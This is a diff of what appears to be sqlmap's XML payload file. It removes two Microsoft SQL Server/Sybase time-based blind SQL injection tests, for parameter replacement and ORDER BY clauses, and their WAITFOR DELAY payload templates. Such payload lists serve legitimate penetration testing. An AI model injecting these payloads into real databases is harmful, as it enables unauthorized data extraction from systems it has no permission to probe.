@@ -1419,27 +1419,6 @@
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase time-based blind - Parameter replace</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,3,9</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Microsoft SQL Server</dbms>
-            <dbms>Sybase</dbms>
-            <os>Windows</os>
-        </details>
-    </test>
-
-    <test>
         <title>Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)</title>
         <stype>5</stype>
         <level>4</level>
@@ -1715,27 +1694,6 @@
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clause</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
-        <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>Microsoft SQL Server</dbms>
-            <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
